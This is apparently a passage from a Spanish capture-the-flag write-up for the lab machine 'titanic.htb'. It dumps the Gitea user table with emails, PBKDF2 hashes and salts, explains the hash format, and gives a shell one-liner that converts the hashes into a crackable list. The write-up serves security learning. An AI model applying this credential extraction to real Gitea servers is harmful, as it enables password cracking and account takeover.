+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739811719|1739810910|1|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|4|0|0|0|0|unified|gitea-auto|0
+3|test1|test1||test@xd.es|0|enabled|0e8d030d481c54a651a8cdb73c6fdb1b2900565ae1f7e95e9a943954fbf722565b76ed69fbae560a4bd55c1e75b9c5262900|pbkdf2$50000$50|0|0|0||0|||16220263a7a014a36bfc775908e2a1ac|fbbe897c5f7e2acc7e9662da1c6033f8|en-US||1739809739|1739814281|1739809739|0|-1|1|0|0|0|0|1|0|02ae5d68572414d3591b9fed657d41b2|test@xd.es|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
+4|hahalol|hahalol||hahalol@gmail.com|0|enabled|f5cbd21458ebc24ae462926e851e21a953030e5f8bdc9f57633bb235b6944a08ae3e91036c8f7f13fd647edb942e3724b7b2|pbkdf2$50000$50|0|0|0||0|||4c43d3ea816ae4f8d0b095f993aad8bc|04c1e5c82ea5009599842f28ffa2b649|en-US||1739810105|1739812965|1739812965|0|-1|1|0|0|0|0|1|0|f1c8843f54a0e2794ea7538d408e0e91|hahalol@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
+5|hacker|hacker||hacker@gmail.com|0|enabled|2ce159ff197379b8598217f304fd62bf23553e51a12b30a50de4ecfc12add4214e88f2969edaa95be6b416eb659db8fb1f98|pbkdf2$50000$50|0|0|0||0|||5ca5776c7a616e8b19b67059de2d1b60|c7b686bac36b14f11712b6e027f73bb7|en-US||1739811981|1739812071|1739811981|0|-1|1|0|0|0|0|1|0|5f2e8c3605a2730d521d111a617aa968|hacker@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
+6|kali|kali||kali@kali.com|0|enabled|1cb922c696dee762c018ad606f8fd7eca87f9642809a3197c98eb661a5e74f1a4a49bed44ef9417d798b5cdb46064d0698bc|pbkdf2$50000$50|0|0|0||0|||be731a58906c441c4afe7e48bef44c7f|ccdee931405a2f5a1178661a185f64b6|en-US||1739812724|1739813242|1739812724|0|-1|1|0|0|0|0|1|0|951dc43cb482734c43d5f7f49dadcff0|kali@kali.com|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
+7|tester|tester||tester@test.com|0|enabled|2a17317ce9211b8e4e44a75de69f017403528d30c0e6c0355ea9af7c350e19c6e1702a5cf90dc6652fc92cb2ac425231d79d|pbkdf2$50000$50|0|0|0||0|||6acd35897112b2862fb07ed947853558|ccf6419a6bc1132e547f5dd94057f124|en-US||1739813080|1739813081|1739813080|0|-1|1|0|0|0|0|1|0|0db53901eca1472a8997a38a24b38d06|tester@test.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
+8|cher0|cher0||none@mail.com|0|enabled|2f1bd1ee4c28629a3fdc8105c8fa3fa47972dc805531aa49b962b309ad7177e83b0506f22eb94873740565f1f434fd2d6d3b|pbkdf2$50000$50|0|0|0||0|||596dccd8ab821622a2a629dc7b5c2bc5|569a0839ffaa6c4a19489a5d1006cf12|en-US||1739813478|1739813900|1739813478|0|-1|1|0|0|0|0|1|0|12a1623f22ef4eec2da37b32549cb0ee|none@mail.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
+sqlite&gt; 
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
+<thead>
+<tr>
+<th dir="ltr">id</th>
+<th dir="ltr">lower_name</th>
+<th dir="ltr">name</th>
+<th dir="ltr">full_name</th>
+<th dir="ltr">email</th>
+<th dir="ltr">keep_email_private</th>
+<th dir="ltr">email_notifications_preference</th>
+<th dir="ltr">passwd</th>
+<th dir="ltr">passwd_hash_algo</th>
+<th dir="ltr">must_change_password</th>
+<th dir="ltr">login_type</th>
+<th dir="ltr">login_source</th>
+<th dir="ltr">login_name</th>
+<th dir="ltr">type</th>
+<th dir="ltr">location</th>
+<th dir="ltr">website</th>
+<th dir="ltr">rands</th>
+<th dir="ltr">salt</th>
+<th dir="ltr">language</th>
+<th dir="ltr">description</th>
+<th dir="ltr">created_unix</th>
+<th dir="ltr">updated_unix</th>
+<th dir="ltr">last_login_unix</th>
+<th dir="ltr">last_repo_visibility</th>
+<th dir="ltr">max_repo_creation</th>
+<th dir="ltr">is_active</th>
+<th dir="ltr">is_admin</th>
+<th dir="ltr">is_restricted</th>
+<th dir="ltr">allow_git_hook</th>
+<th dir="ltr">allow_import_local</th>
+<th dir="ltr">allow_create_organization</th>
+<th dir="ltr">prohibit_login</th>
+<th dir="ltr">avatar</th>
+<th dir="ltr">avatar_email</th>
+<th dir="ltr">use_custom_avatar</th>
+<th dir="ltr">num_followers</th>
+<th dir="ltr">num_following</th>
+<th dir="ltr">num_stars</th>
+<th dir="ltr">num_repos</th>
+<th dir="ltr">num_teams</th>
+<th dir="ltr">num_members</th>
+<th dir="ltr">visibility</th>
+<th dir="ltr">repo_admin_change_team_access</th>
+<th dir="ltr">diff_view_style</th>
+<th dir="ltr">theme</th>
+<th dir="ltr">keep_activity_private</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td dir="auto">1</td>
+<td dir="ltr">administrator</td>
+<td dir="ltr">administrator</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:root@titanic.htb" rel="noopener nofollow" class="external-link" href="mailto:root@titanic.htb" target="_blank">root@titanic.htb</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">70a5bd0c1a5d23caa49030172cdcabdc</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1722595379</td>
+<td dir="auto">1722597477</td>
+<td dir="auto">1722597477</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">2d149e5fbd1b20cf31db3e3c6a28fc9b</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:root@titanic.htb" rel="noopener nofollow" class="external-link" href="mailto:root@titanic.htb" target="_blank">root@titanic.htb</a></td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">2</td>
+<td dir="ltr">developer</td>
+<td dir="ltr">developer</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:developer@titanic.htb" rel="noopener nofollow" class="external-link" href="mailto:developer@titanic.htb" target="_blank">developer@titanic.htb</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">0ce6f07fc9b557bc070fa7bef76a0d15</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1722595646</td>
+<td dir="auto">1739811719</td>
+<td dir="auto">1739810910</td>
+<td dir="auto">1</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">8bf3e3452b78544f8bee9400d6936d34</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:developer@titanic.htb" rel="noopener nofollow" class="external-link" href="mailto:developer@titanic.htb" target="_blank">developer@titanic.htb</a></td>
+<td dir="auto">0</td>
+<td dir="auto">4</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="ltr">unified</td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">3</td>
+<td dir="ltr">test1</td>
+<td dir="ltr">test1</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:test@xd.es" rel="noopener nofollow" class="external-link" href="mailto:test@xd.es" target="_blank">test@xd.es</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">0e8d030d481c54a651a8cdb73c6fdb1b2900565ae1f7e95e9a943954fbf722565b76ed69fbae560a4bd55c1e75b9c5262900</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">16220263a7a014a36bfc775908e2a1ac</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739809739</td>
+<td dir="auto">1739814281</td>
+<td dir="auto">1739809739</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">fbbe897c5f7e2acc7e9662da1c6033f8</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:test@xd.es" rel="noopener nofollow" class="external-link" href="mailto:test@xd.es" target="_blank">test@xd.es</a></td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="ltr">unified</td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">4</td>
+<td dir="ltr">hahalol</td>
+<td dir="ltr">hahalol</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:hahalol@gmail.com" rel="noopener nofollow" class="external-link" href="mailto:hahalol@gmail.com" target="_blank">hahalol@gmail.com</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">f5cbd21458ebc24ae462926e851e21a953030e5f8bdc9f57633bb235b6944a08ae3e91036c8f7f13fd647edb942e3724b7b2</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">4c43d3ea816ae4f8d0b095f993aad8bc</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739810105</td>
+<td dir="auto">1739812965</td>
+<td dir="auto">1739812965</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">04c1e5c82ea5009599842f28ffa2b649</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:hahalol@gmail.com" rel="noopener nofollow" class="external-link" href="mailto:hahalol@gmail.com" target="_blank">hahalol@gmail.com</a></td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">5</td>
+<td dir="ltr">hacker</td>
+<td dir="ltr">hacker</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:hacker@gmail.com" rel="noopener nofollow" class="external-link" href="mailto:hacker@gmail.com" target="_blank">hacker@gmail.com</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">2ce159ff197379b8598217f304fd62bf23553e51a12b30a50de4ecfc12add4214e88f2969edaa95be6b416eb659db8fb1f98</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">5ca5776c7a616e8b19b67059de2d1b60</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739811981</td>
+<td dir="auto">1739812071</td>
+<td dir="auto">1739811981</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">c7b686bac36b14f11712b6e027f73bb7</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:hacker@gmail.com" rel="noopener nofollow" class="external-link" href="mailto:hacker@gmail.com" target="_blank">hacker@gmail.com</a></td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">6</td>
+<td dir="ltr">kali</td>
+<td dir="ltr">kali</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:kali@kali.com" rel="noopener nofollow" class="external-link" href="mailto:kali@kali.com" target="_blank">kali@kali.com</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">1cb922c696dee762c018ad606f8fd7eca87f9642809a3197c98eb661a5e74f1a4a49bed44ef9417d798b5cdb46064d0698bc</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">be731a58906c441c4afe7e48bef44c7f</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739812724</td>
+<td dir="auto">1739813242</td>
+<td dir="auto">1739812724</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">ccdee931405a2f5a1178661a185f64b6</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:kali@kali.com" rel="noopener nofollow" class="external-link" href="mailto:kali@kali.com" target="_blank">kali@kali.com</a></td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="ltr">unified</td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">7</td>
+<td dir="ltr">tester</td>
+<td dir="ltr">tester</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:tester@test.com" rel="noopener nofollow" class="external-link" href="mailto:tester@test.com" target="_blank">tester@test.com</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">2a17317ce9211b8e4e44a75de69f017403528d30c0e6c0355ea9af7c350e19c6e1702a5cf90dc6652fc92cb2ac425231d79d</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">6acd35897112b2862fb07ed947853558</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739813080</td>
+<td dir="auto">1739813081</td>
+<td dir="auto">1739813080</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">ccf6419a6bc1132e547f5dd94057f124</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:tester@test.com" rel="noopener nofollow" class="external-link" href="mailto:tester@test.com" target="_blank">tester@test.com</a></td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+<tr>
+<td dir="auto">8</td>
+<td dir="ltr">cher0</td>
+<td dir="ltr">cher0</td>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:none@mail.com" rel="noopener nofollow" class="external-link" href="mailto:none@mail.com" target="_blank">none@mail.com</a></td>
+<td dir="auto">0</td>
+<td dir="ltr">enabled</td>
+<td dir="ltr">2f1bd1ee4c28629a3fdc8105c8fa3fa47972dc805531aa49b962b309ad7177e83b0506f22eb94873740565f1f434fd2d6d3b</td>
+<td dir="ltr">pbkdf2$50000$50</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="auto"></td>
+<td dir="ltr">596dccd8ab821622a2a629dc7b5c2bc5</td>
+<td dir="ltr">en-US</td>
+<td dir="auto"></td>
+<td dir="auto">1739813478</td>
+<td dir="auto">1739813900</td>
+<td dir="auto">1739813478</td>
+<td dir="auto">0</td>
+<td dir="auto">-1</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">1</td>
+<td dir="auto">0</td>
+<td dir="ltr">569a0839ffaa6c4a19489a5d1006cf12</td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="mailto:none@mail.com" rel="noopener nofollow" class="external-link" href="mailto:none@mail.com" target="_blank">none@mail.com</a></td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="auto">0</td>
+<td dir="ltr">unified</td>
+<td dir="auto"></td>
+<td dir="auto">0</td>
+</tr>
+</tbody>
+</table></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="**Cómo están hasheadas las contraseñas**" dir="auto" class="heading" id="**Cómo_están_hasheadas_las_contraseñas**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Cómo están hasheadas las contraseñas</strong></h3><div class="heading-children"><div class="el-ol"><ol>
+<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
+<p><strong>Algoritmo de hashing</strong> :</p>
+<ul>
+<li data-line="2" dir="auto">El campo <code>passwd_hash_algo</code> indica que el algoritmo utilizado es <strong>PBKDF2</strong> .</li>
+</ul>
+</li>
+<li data-line="4" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
+<p><strong>Configuración del hash</strong> :</p>
+<ul>
+<li data-line="6" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Según el valor <code>pbkdf2$50000$50</code>:
+<ul>
+<li data-line="7" dir="auto"><strong>Iteraciones</strong> : 50,000.</li>
+<li data-line="8" dir="auto"><strong>Longitud del hash</strong> : 50 bytes (en formato hexadecimal).</li>
+<li data-line="9" dir="auto"><strong>Función hash subyacente</strong> : SHA-512 (implícito en PBKDF2).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-line="10" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
+<p><strong>Salt</strong> :</p>
+<ul>
+<li data-line="12" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>El salt está almacenado en el campo <code>salt</code>. Por ejemplo:
+<ul>
+<li data-line="13" dir="auto">Para el usuario <code>administrator</code>: <code>70a5bd0c1a5d23caa49030172cdcabdc</code>.</li>
+<li data-line="14" dir="auto">Para el usuario <code>developer</code>: <code>0ce6f07fc9b557bc070fa7bef76a0d15</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-line="16" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
+<p><strong>Estructura del hash</strong> :</p>
+<ul>
+<li data-line="18" dir="auto">El hash final (<code>passwd</code>) es el resultado de aplicar PBKDF2 sobre la contraseña original, utilizando el salt correspondiente y realizando 50,000 iteraciones. (esta jodida...)</li>
+</ul>
+</li>
+</ol></div><div class="el-p"><p dir="auto">Script para sacar el hash de la base de datos;</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">sqlite3 gitea<span class="token punctuation">.</span>db <span class="token string">"select passwd,salt,name from user"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token keyword">read</span> <span class="token keyword">data</span><span class="token punctuation">;</span> <span class="token keyword">do</span> digest<span class="token operator">=</span>$<span class="token punctuation">(</span>echo <span class="token string">"$data"</span> <span class="token operator">|</span> cut <span class="token operator">-</span>d<span class="token string">'|'</span> <span class="token operator">-</span>f1 <span class="token operator">|</span> xxd <span class="token operator">-</span>r <span class="token operator">-</span>p <span class="token operator">|</span> base64<span class="token punctuation">)</span><span class="token punctuation">;</span> salt<span class="token operator">=</span>$<span class="token punctuation">(</span>echo <span class="token string">"$data"</span> <span class="token operator">|</span> cut <span class="token operator">-</span>d<span class="token string">'|'</span> <span class="token operator">-</span>f2 <span class="token operator">|</span> xxd <span class="token operator">-</span>r <span class="token operator">-</span>p <span class="token operator">|</span> base64<span class="token punctuation">)</span><span class="token punctuation">;</span> name<span class="token operator">=</span>$<span class="token punctuation">(</span>echo $<span class="token keyword">data</span> <span class="token operator">|</span> cut <span class="token operator">-</span>d<span class="token string">'|'</span> <span class="token operator">-</span>f <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> echo <span class="token string">"${name}:sha256:50000:${salt}:${digest}"</span><span class="token punctuation">;</span> done <span class="token operator">|</span> tee gitea<span class="token punctuation">.</span>hashes
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw<span class="token operator">==</span>:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY<span class="token operator">=</span>
+developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA<span class="token operator">==</span>:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y<span class="token operator">=</span>
+test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A<span class="token operator">==</span>:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA<span class="token operator">=</span>
+hahalol:sha256:50000:BMHlyC6lAJWZhC8o/6K2SQ<span class="token operator">==</span>:9cvSFFjrwkrkYpJuhR4hqVMDDl+L3J9XYzuyNbaUSgiuPpEDbI9/E/1kftuULjckt7I<span class="token operator">=</span>
+hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw<span class="token operator">==</span>:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g<span class="token operator">=</span>
+kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg<span class="token operator">==</span>:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw<span class="token operator">=</span>
+tester:sha256:50000:zPZBmmvBEy5Uf13ZQFfxJA<span class="token operator">==</span>:KhcxfOkhG45ORKdd5p8BdANSjTDA5sA1XqmvfDUOGcbhcCpc+Q3GZS/JLLKsQlIx150<span class="token operator">=</span>
+cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg<span class="token operator">==</span>:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs<span class="token operator">=</span>
